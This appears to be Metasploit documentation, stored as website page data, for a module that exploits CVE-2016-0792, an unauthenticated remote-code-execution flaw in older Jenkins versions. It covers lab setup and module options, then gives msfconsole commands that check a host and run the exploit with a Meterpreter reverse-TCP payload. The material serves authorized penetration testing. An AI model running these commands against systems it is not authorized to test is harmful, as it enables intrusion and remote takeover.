{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/jenkins_xstream_deserialize","result":{"data":{"moduleMetadataJson":{"id":"25f13787-bfa3-5020-9713-525ebe714f52","name":"Jenkins XStream Groovy classpath Deserialization Vulnerability","fullname":"exploit/multi/http/jenkins_xstream_deserialize","description":"This module exploits CVE-2016-0792 a vulnerability in Jenkins versions older than 1.650 and Jenkins LTS versions\n        older than 1.642.2 which is caused by unsafe deserialization in XStream with Groovy in the classpath,\n        which allows remote arbitrary code execution. The issue affects default installations. Authentication\n        is not required to exploit the vulnerability.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/jenkins_xstream_deserialize","documentationSlug":"/modules/documentation/exploit/multi/http/jenkins_xstream_deserialize"},"documentation":{"html":"<p>Jenkins XStream Groovy classpath Deserialization Vulnerability (CVE-2016-0792)</p>\n<p>This module exploits a vulnerability in Jenkins versions older than 1.650 and Jenkins LTS versions older than 1.642.2 which is caused by unsafe deserialization in XStream with Groovy in the classpath, which allows remote arbitrary code execution. The issue affects default installations. Authentication is not required to exploit the vulnerability.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Jenkins versions &#x3C; 1.650 and Jenkins LTS versions &#x3C; 1.642.2</p>\n<p>Download Jenkins (Windows) &#x3C; version 1.650 from here:\n<a href=\"http://mirrors.jenkins-ci.org/windows/\">http://mirrors.jenkins-ci.org/windows/</a></p>\n<p>Windows Installation: Double click .msi</p>\n<p>Download Jenkins LTS (Debian) &#x3C; version 1.642.2 from here:\n<a href=\"https://pkg.jenkins.io/debian-stable/\">https://pkg.jenkins.io/debian-stable/</a></p>\n<p>Download Jenkins (Debian) &#x3C; version 1.650 from here:\n<a href=\"https://pkg.jenkins.io/debian/\">https://pkg.jenkins.io/debian/</a></p>\n<p>Debian Installation: <code class=\"language-text\">sudo dpkg --install jenkins_1.642.1_all.deb</code></p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>TARGETURI</strong></p>\n<p>The base path to Jenkins application <code class=\"language-text\">/</code> by default</p>\n<p><strong>VHOST</strong></p>\n<p>The HTTP server virtual host. You may need to configure this as well, even though it is set as optional.</p>\n<p><strong>The Check Command</strong></p>\n<p>The <code class=\"language-text\">jenkins_xstream_deserialize</code> module comes with a check command that can attempt to check if the remote host is vulnerable or not. To use this, configure the msfconsole similar to the following:</p>\n<p>Note: The check only uses <code class=\"language-text\">appears to be vulnerable</code> because it is not possible to differentiate from HTTP headers which Jenkins line (Weekly or LTS) is running.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">set RHOST [IP]\n\nset TARGETURI [path to Jenkins]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(jenkins_xstream_deserialize) &gt; check\n\n[*] 192.168.1.64:8080 The target appears to be vulnerable..</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>Exploiting the Host</strong></p>\n<p>After identifying the vulnerability on the target machine, you can try to exploit it. Be sure to set TARGETURI to the correct URI for your application, and the TARGET variable for the appropriate host OS.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(jenkins_xstream_deserialize) &gt; set RHOST 192.168.1.37\nRHOST =&gt; 192.168.1.37\nmsf exploit(jenkins_xstream_deserialize) &gt; set target 3\ntarget =&gt; 3\nmsf exploit(jenkins_xstream_deserialize) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf exploit(jenkins_xstream_deserialize) &gt; exploit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"25f13787-bfa3-5020-9713-525ebe714f52"}}}